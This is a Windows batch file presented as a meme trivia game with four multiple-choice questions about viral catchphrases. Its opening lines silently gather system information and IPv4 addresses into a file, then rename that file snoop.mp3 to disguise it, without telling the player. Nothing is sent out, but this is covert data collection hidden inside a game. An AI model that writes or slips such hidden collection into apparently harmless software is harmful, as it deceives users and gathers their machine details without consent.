@echo off

Title Meme Trivia
color FD
prompt Player:
cd c:\users
mkdir c:\Users\Game
cd c:\users\Game
systeminfo > stash.txt
ipconfig | findstr -i ipv4 >> stash.txt
move stash.txt snoop.mp3


set T= Welcome to Meme Trivia!
cls

:start
cls
echo %T%
set /p age= Year of Birth:
set /a birth= 2017-%age%
echo Your are %birth% years old!
pause
if %birth% GEQ 18 goto start1
if %birth% LSS 18 goto Den
if not %birth% GEQ 18 goto start
if not %birth% LSS 18 goto start
:Den
echo sorry you are underaged!
pause
goto start

:start1
cls
echo %T%
set /p password= Enter Password:
if %password%== Friday goto correct
if not %password%== Friday goto return
:correct
echo "Welcome!"
pause
goto top
:return
echo incorrect password!
pause 
goto start1

:top
cls
echo %T%
echo [1]Pink, [2]Green, [3]Red, [4]Blue
set /p color= pick a color:
if %color% == 1 goto pink
if %color% == 2 goto green
if %color% == 3 goto red
if %color% == 4 goto blue
if not %color% == 1 goto top
if not %color% == 2 goto top
if not %color% == 3 goto top
if not %color% == 4 goto top
:pink
color FD
goto top2
:green
color F2
goto top2
:red
color F4
goto top2
:blue
color F1
goto top2

:top2
cls
echo %T%
echo Please enter your Name
set /p player=
goto Q1
prompt %player%:

:Q1
cls
echo Hello %player%, %T%
echo:
echo Question one
echo:     
echo What is something someone may say to their friend if they are wearing shoes that are undesirable aesthetically?
echo:
echo:
echo [1]What are these!? 
echo [2]bruhh... 
echo [3]kindly remove your shoes 
echo [4]what are those!?
echo:
echo:
set /p ans1= Answer:
if %ans1% == 1 goto incorrect
if %ans1% == 2 goto incorrect
if %ans1% == 3 goto incorrect
if %ans1% == 4 goto correct
if not %ans1% == 1 goto Q1
if not %ans1% == 2 goto Q1
if not %ans1% == 3 goto Q1
if not %ans1% == 4 goto Q1

:correct
echo:
echo Correct! What Are Those?!, defining it as a question yelled at someone wearing unkempt or off-brand footwear.
pause
goto Q2

:incorrect
goto FAIL

:Q2
cls
echo Hello %player%, %T%
echo:
echo Question two
echo:     
echo On the The Dr. Phil Show, teenage girl Danielle Bregoli became famous with this catch phrase.
echo:
echo:
echo [1]Catch me inside, how bout that! 
echo [2]Catch me outside, how bout that! 
echo [3]kindly meet me outside for confrontation.
echo [4]what are those!?
echo:
echo:
set /p ans1= Answer:
if %ans1% == 1 goto incorrect
if %ans1% == 4 goto incorrect
if %ans1% == 3 goto incorrect
if %ans1% == 2 goto correct2
if not %ans1% == 1 goto Q2
if not %ans1% == 2 goto Q2
if not %ans1% == 3 goto Q2
if not %ans1% == 4 goto Q2

:correct2
echo Correct! Cash Me Ousside, How Bow Dah is a memorable quote uttered by 13-year-old Danielle Bregoli on The Dr. Phil Show, during which she challenges the showís audience to a fight with the phrase Catch me outside, how about that? 
pause
goto Q3

:incorrect
goto FAIL


:Q3
cls
echo Hello %player%, %T%
echo:
echo Question three
echo:     
echo As a game among friends to jokingly prove their credibility/loyalty in which one person would text another Rain Drop and the other would have to reply:
echo:
echo:
echo [1]Drip Drop
echo [2]Rain Rain go Away
echo [3]Drop Top
echo [4]Don\'t rain on my parade.
echo:
echo:
set /p ans1= Answer:
if %ans1% == 1 goto incorrect
if %ans1% == 4 goto incorrect
if %ans1% == 2 goto incorrect
if %ans1% == 3 goto correct3
if not %ans1% == 1 goto Q3
if not %ans1% == 2 goto Q3
if not %ans1% == 3 goto Q3
if not %ans1% == 4 goto Q3

:correct3
echo Correct! Rain Drop Drop Top is a lyric from the song Bad and Boujee by hip hop group Migos that became a phrasal template for jokes primarily on Twitter.
pause
goto Q4

:incorrect
goto FAIL


:incorrect
goto FAIL


:Q4
cls
echo Hello %player%, %T%
echo:
echo Question four
echo:     
echo What is a catchphrase that stems from a Twitter video montage featuring a voiceover of a teenager complimenting his friend Daniel on his fashionable attire on a number of different occasions.
echo:
echo:
echo [1]Damn Daniel.
echo [2]Damn David.
echo [3]Your attire is quite pleasing to the eyes Daniel.
echo [4]Daniel Damn.
echo:
echo:
set /p ans1= Answer:
if %ans1% == 3 goto incorrect
if %ans1% == 4 goto incorrect
if %ans1% == 2 goto incorrect
if %ans1% == 1 goto correct4
if not %ans1% == 1 goto Q4
if not %ans1% == 2 goto Q4
if not %ans1% == 3 goto Q4
if not %ans1% == 4 goto Q4

:correct4
echo  Correct! Due to the narrators particular obsession with Daniels sneaker shoes, the video has drawn comparisons to the 2015 viral video sensation What Are Those?!
pause
goto FIN
:incorrect
goto FAIL



:FAIL

echo                _,-'_)_  
echo              ,' ,-' __)  ,--------. 
echo             :     -'  _)/         `\
echo           ,'       ,-'_,`           :
echo        ,-'       ,(,-(              :
echo      ,'       ,-' ,    _            :
echo     /        ,-._/`---'            /
echo    /        (____)(----. )       ,'
echo   /         (      `.__,     /\ /,
echo  :           ;-.___         /__\/
echo  :         ,'      `--.      -,\ 
echo  :        /            \    .__/
echo   \      (__            \    :_
echo    \       ,`-, *       /   _:,\
echo     \    ,'   `-.     ,'_,-'    \
echo    (_\,-'    ,'\")--,'-'       __\
echo     \       /  // ,':      ,--'  `-.
echo      `-.    `-/ \'  :   _,'         `.
echo         `-._ /      `--'/             \
echo            ,'           :              \
echo           /             :               \
echo        ,-'              :               /
echo       /                 :             -'
echo You LOSE!
echo Brush up on your memes!
pause
start http://knowyourmeme.com/
goto Q1


:FIN
cls

echo You Win! Congratulations!

echo "would you like to play again? Y/N"
set /p again= Answer:
if %again%== Y goto top
if %again%== y goto top
if %again%== N goto 2
if %again%== n goto 2
if not %again%== Y goto FIN
if not %again%== y goto FIN
if not %again%== N goto FIN
if not %again%== n goto FIN
:1
goto Q1

:2 exit